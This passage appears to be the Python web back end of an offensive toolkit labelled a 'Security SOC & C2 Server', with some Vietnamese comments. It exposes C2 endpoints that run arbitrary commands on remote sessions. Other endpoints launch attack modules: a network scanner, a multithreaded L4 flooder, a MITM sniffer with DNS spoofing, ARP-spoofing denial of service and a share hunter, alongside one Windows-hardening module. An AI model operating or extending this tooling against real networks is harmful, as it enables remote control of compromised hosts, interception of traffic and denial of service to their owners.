                self.wfile.write(text.encode("utf-8"))
            else:
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            return

        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        req_path = self.path.split("?")[0]
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        
        try:
            payload = json.loads(post_data) if post_data else {}
        except Exception:
            payload = {}

        # -----------------------------------------------------------------
        # REPORTING ENDPOINTS (Tương thích reporter.py & attack modules)
        # -----------------------------------------------------------------
        if req_path == "/api/module-status":
            if not self._check_auth():
                self._send_json(401, {"ok": False, "error": "Unauthorized: Invalid API Token"})
                return
            name = str(payload.get("name") or "Unknown module").strip()[:120]
            status = str(payload.get("status") or "UNKNOWN").strip().upper()[:32]
            target = str(payload.get("target") or "None").strip()[:240]
            message = str(payload.get("message") or "").strip()[:500]
            metrics = payload.get("metrics") if isinstance(payload.get("metrics"), dict) else {}
            now = time.time()

            with active_module_lock:
                prev_status = active_module_state.get("status")
                prev_name = active_module_state.get("name")
                started_at = payload.get("started_at")
                if not isinstance(started_at, (int, float)):
                    same_op = prev_name == name and prev_status not in TERMINAL_STATUSES
                    started_at = active_module_state.get("started_at") if same_op else now

                active_module_state.update({
                    "name": name,
                    "status": status,
                    "target": target,
                    "message": message,
                    "metrics": metrics,
                    "started_at": started_at,
                    "updated_at": now,
                    "ended_at": now if status in TERMINAL_STATUSES else None,
                })
                if (prev_name, prev_status) != (name, status):
                    log_msg = message or f"{name} chuyển trạng thái sang {status}."
                    log_type = "err" if status == "FAILED" else "warn" if status in {"STOPPING", "STOPPED"} else "succ"
                    add_log(f"[{name.upper()}] {log_msg}", log_type, module=name, target=target)

            # Đồng bộ job đang chạy với báo cáo từ TUI/reporter
            with jobs_lock:
                for key, job in module_jobs.items():
                    if job.get("label") == name or key == name.lower():
                        job["status"] = status
                        job["target"] = target
                        job["message"] = message or job.get("message")
                        job["metrics"] = metrics
                        job["updated_at"] = now
                        if status in TERMINAL_STATUSES:
                            job["ended_at"] = now
                        break
            self._send_json(200, {"ok": True, "active_module": dict(active_module_state)})
            return

        if req_path == "/api/events":
            if not self._check_auth():
                self._send_json(401, {"ok": False, "error": "Unauthorized: Invalid API Token"})
                return
            msg = str(payload.get("message") or payload.get("msg") or "").strip()[:1000]
            if not msg:
                self._send_json(400, {"ok": False, "error": "Event message is required"})
                return
            mod = payload.get("module")
            target = payload.get("target")
            prefix = f"[{mod.upper()}] " if mod else ""
            add_log(f"{prefix}{msg}", payload.get("type", "info"), module=mod, target=target)
            self._send_json(200, {"ok": True})
            return

        if req_path == "/api/findings":
            if not self._check_auth():
                self._send_json(401, {"ok": False, "error": "Unauthorized: Invalid API Token"})
                return
            finding = {
                "time": time.strftime("%H:%M:%S"),
                "module": str(payload.get("module") or "Unknown module")[:120],
                "target": str(payload.get("target") or "None")[:240],
                "severity": str(payload.get("severity") or "info").lower()[:24],
                "title": str(payload.get("title") or "Finding")[:200],
                "details": str(payload.get("details") or "")[:2000],
            }
            with findings_lock:
                findings_history.append(finding)
                if len(findings_history) > 200:
                    findings_history.pop(0)
            sev = finding["severity"].lower()
            log_type = "err" if sev in {"crit", "critical", "high", "err"} else "warn" if sev in {"med", "medium"} else "succ" if sev == "succ" else "cyan"
            add_log(f"[FINDING-{finding['severity'].upper()}] {finding['title']} -> {finding['target']}", log_type, module=finding['module'], target=finding['target'])
            self._send_json(200, {"ok": True, "finding": finding})
            return

        # -----------------------------------------------------------------
        # CONTROLLER & C2 ENDPOINTS (Kiểm tra bảo mật)
        # -----------------------------------------------------------------
        if not self._check_auth():
            self._send_json(401, {"status": "error", "message": "Unauthorized"})
            return

        # API: C2 Toggle Listener / session control
        if req_path == "/api/c2/action":
            act = (payload.get("action") or "").strip().lower()
            session_id = payload.get("session_id")
            if act == "start":
                ok, msg = c2_manager.start_listener()
            elif act == "stop":
                ok, msg = c2_manager.stop_listener()
            elif act == "select":
                ok, msg = c2_manager.select_session(session_id)
            elif act == "close-session":
                ok, msg = c2_manager.close_session(session_id)
            else:
                ok, msg = False, f"Hành động không hợp lệ: {act}"
            self._send_json(200, {"status": "ok" if ok else "error", "message": msg,
                                  "c2": c2_manager.get_status()})
            return

        # API: C2 Execute Command (async job, dashboard poll /api/c2/job)
        if req_path == "/api/c2/exec":
            cmd_text = (payload.get("command") or "").strip()
            session_id = payload.get("session_id")
            timeout = payload.get("timeout")
            try:
                timeout = float(timeout) if timeout else 70.0
            except Exception:
                timeout = 70.0
            timeout = max(5.0, min(timeout, 600.0))

            if not cmd_text:
                self._send_json(200, {"status": "error", "output": "Lệnh không được để trống"})
                return

            if payload.get("wait"):
                ok, out, exit_code = c2_manager.execute_command(cmd_text, session_id=session_id, timeout=timeout)
                self._send_json(200, {"status": "ok" if ok else "error", "output": out, "exit_code": exit_code})
                return

            job_id = c2_manager.start_exec_job(cmd_text, session_id=session_id, timeout=timeout)
            self._send_json(200, {"status": "ok", "job_id": job_id, "message": "Đã gửi lệnh, theo dõi qua /api/c2/job"})
            return

        # Điều khiển hành động (Start Module)
        if req_path == "/api/action/start":
            action = (payload.get("action") or "").strip()
            known_actions = {"scan", "stress", "mitm", "arp_kill", "hardening", "share_hunter"}
            if action not in known_actions:
                self._send_json(400, {"status": "error", "message": f"Action không hợp lệ: {action}"})
                return
            res = {"status": "ok", "message": f"Kích hoạt {action}"}
            
            with process_lock:
                if action == "scan":
                    if "scan" not in active_processes or active_processes["scan"].poll() is not None:
                        subnet = payload.get("subnet", "AUTO")
                        scan_mode = payload.get("mode", "2")
                        note = payload.get("note", "").strip()
                        log_msg = f"Bắt đầu quét mạng LAN (Subnet: {subnet}, Mode: {scan_mode})"
                        if note: log_msg += f" [Ghi chú: {note}]"
                        add_log(log_msg, "cyan", module="SCAN")
                        
                        sub_env = os.environ.copy()
                        sub_env["PYTHONUNBUFFERED"] = "1"
                        sub_env["PYTHONIOENCODING"] = "utf-8"

                        cmd = get_py_runner("attacks/net_scan.py", subnet, scan_mode)
                        p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                             bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                             creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                        active_processes["scan"] = p
                        register_module_job("scan", "LAN Scanner & Device Finder", target=subnet, message=log_msg, pid=p.pid)
                        threading.Thread(target=stream_process_output, args=(p, "SCAN", "scan"), daemon=True).start()
                    else:
                        res = {"status": "busy", "message": "Tiến trình quét đang hoạt động!"}

                elif action == "stress":
                    target = payload.get("target", "ALL")
                    port = str(payload.get("port", "80"))
                    mode = payload.get("mode", "BOTH")
                    threads = str(payload.get("threads", "500"))
                    duration = str(payload.get("duration", "30"))
                    note = payload.get("note", "").strip()
                    
                    log_msg = f"Khởi động L4 Flooder [{mode}] -> {target}:{port} ({threads} threads, {duration}s)"
                    if note: log_msg += f" [Ghi chú: {note}]"
                    add_log(log_msg, "warn", module="L4-STRESS")
                    
                    sub_env = os.environ.copy()
                    sub_env["PYTHONUNBUFFERED"] = "1"
                    sub_env["PYTHONIOENCODING"] = "utf-8"

                    cmd = get_py_runner("attacks/l4_stress_tester.py", target, port, mode, duration, threads)
                    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                             bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                             creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    active_processes["stress"] = p
                    register_module_job("stress", "L4 Stress Tester", target=f"{target}:{port}", message=log_msg, pid=p.pid)
                    threading.Thread(target=stream_process_output, args=(p, "L4-STRESS", "stress"), daemon=True).start()

                elif action == "mitm":
                    target = payload.get("target", "ALL")
                    gateway = payload.get("gateway") or GATEWAY_IP
                    dns_spoofer = payload.get("dns_spoofer", False)
                    note = payload.get("note", "").strip()
                    
                    log_msg = f"Khởi động MITM Sniffer -> Mục tiêu: {target} (Gateway: {gateway})"
                    if dns_spoofer: log_msg += " [DNS SPOOFER: YES]"
                    if note: log_msg += f" [Ghi chú: {note}]"
                    add_log(log_msg, "warn", module="MITM")
                    
                    sub_env = os.environ.copy()
                    sub_env["PYTHONUNBUFFERED"] = "1"
                    sub_env["PYTHONIOENCODING"] = "utf-8"

                    extra_args = ["--dns-spoofer"] if dns_spoofer else []
                    sub_env["NEXUS_MODULE_KEY"] = "mitm"
                    cmd = get_py_runner("attacks/mitm_sniffer.py", target, gateway, *extra_args)
                    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                         bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                         creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    active_processes["mitm"] = p
                    register_module_job("mitm", "MITM Sniffer", target=target, message=log_msg, pid=p.pid)
                    threading.Thread(target=stream_process_output, args=(p, "MITM", "mitm"), daemon=True).start()

                elif action == "arp_kill":
                    target = payload.get("target", "ALL")
                    gateway = payload.get("gateway") or GATEWAY_IP
                    note = payload.get("note", "").strip()
                    
                    log_msg = f"Kích hoạt DoS Cô Lập Mạng (ARP Spoofing) -> {target}"
                    if note: log_msg += f" [Ghi chú: {note}]"
                    add_log(log_msg, "err", module="ARP-KILL")
                    
                    sub_env = os.environ.copy()
                    sub_env["PYTHONUNBUFFERED"] = "1"
                    sub_env["PYTHONIOENCODING"] = "utf-8"

                    cmd = get_py_runner("attacks/arp_vkill.py", target, gateway)
                    sub_env["NEXUS_MODULE_KEY"] = "arp_kill"
                    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                         bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                         creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    active_processes["arp_kill"] = p
                    register_module_job("arp_kill", "ARP Spoofing (DoS)", target=target, message=log_msg, pid=p.pid)
                    threading.Thread(target=stream_process_output, args=(p, "ARP-KILL", "arp_kill"), daemon=True).start()

                elif action == "share_hunter":
                    target = payload.get("target", "ALL")
                    deep = bool(payload.get("deep"))
                    note = payload.get("note", "").strip()
                    log_msg = f"Kiểm tra chia sẻ mạng & dịch vụ (Share Hunter) -> {target}" + (" [DEEP AUDIT]" if deep else "")
                    if note: log_msg += f" [Ghi chú: {note}]"
                    add_log(log_msg, "cyan", module="SHARE-HUNTER")

                    sub_env = os.environ.copy()
                    sub_env["PYTHONUNBUFFERED"] = "1"
                    sub_env["PYTHONIOENCODING"] = "utf-8"
                    sub_env["NEXUS_MODULE_KEY"] = "share_hunter"

                    extra = ["deep"] if deep else []
                    cmd = get_py_runner("attacks/share_hunter.py", target, *extra)
                    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                         bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                         creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    active_processes["share_hunter"] = p
                    register_module_job("share_hunter", "Share Hunter", target=target, message=log_msg, pid=p.pid)
                    threading.Thread(target=stream_process_output, args=(p, "SHARE-HUNTER", "share_hunter"), daemon=True).start()

                elif action == "hardening":
                    note = payload.get("note", "").strip()
                    log_msg = "Bắt đầu áp dụng Windows Hardening (Bảo vệ hệ thống)..."
                    if note: log_msg += f" [Ghi chú: {note}]"
                    add_log(log_msg, "succ", module="DEFENSE")
                    
                    sub_env = os.environ.copy()
                    sub_env["PYTHONUNBUFFERED"] = "1"
                    sub_env["PYTHONIOENCODING"] = "utf-8"

                    cmd = get_py_runner("defense/windows_defend.py")
                    p = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                         bufsize=1, encoding="utf-8", errors="replace", env=sub_env,
                                         creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    active_processes["hardening"] = p
                    register_module_job("hardening", "Windows Hardening", target="localhost", message=log_msg, pid=p.pid)
                    threading.Thread(target=stream_process_output, args=(p, "DEFENSE", "hardening"), daemon=True).start()

            with jobs_lock:
                started_job = dict(module_jobs.get(action) or {})
            if started_job:
                res["job"] = started_job

            self._send_json(200, res)
            return

        # Dừng hành động (Stop Module) — graceful trước, kill sau
        if req_path == "/api/action/stop":
            module_name = (payload.get("module") or payload.get("action") or "").strip()
            results = []
            with process_lock:
                targets = list(active_processes.items()) if module_name == "ALL" else [
                    (module_name, active_processes[module_name])
                ] if module_name in active_processes else []
            for key, proc in targets:
                results.append(stop_process(key, proc))
            if not targets:
                add_log(f"Không có tiến trình nào đang chạy cho module: {module_name}", "warn")
            self._send_json(200, {"status": "stopped", "results": results})
            return

        self.send_response(404)
        self.end_headers()

# -----------------------------------------------------------------------------
# LIFECYCLE & SERVER RUNNER
# -----------------------------------------------------------------------------
server_instance = None

def stop_all_processes():
    with process_lock:
        items = list(active_processes.items())
    for key, proc in items:
        try:
            stop_process(key, proc, timeout=8.0)
        except Exception:
            pass
    with process_lock:
        active_processes.clear()
    c2_manager.stop_listener()

def start_server_in_thread(port=PORT):
    global server_instance, PORT
    PORT = port
    server_instance = ThreadingHTTPServer(("0.0.0.0", PORT), AppHandler)
    server_thread = threading.Thread(target=server_instance.serve_forever, daemon=True)
    server_thread.start()
    return server_instance

def stop_server():
    global server_instance
    stop_all_processes()
    if server_instance:
        try:
            server_instance.shutdown()
            server_instance.server_close()
        except Exception:
            pass
        server_instance = None

def main():
    global server_instance
    server_instance = ThreadingHTTPServer(("0.0.0.0", PORT), AppHandler)
    print(f"[*] Unified Security SOC & C2 Server listening on http://127.0.0.1:{PORT}")
    try:
        server_instance.serve_forever()
    except KeyboardInterrupt:
        stop_server()

if __name__ == "__main__":
    main()
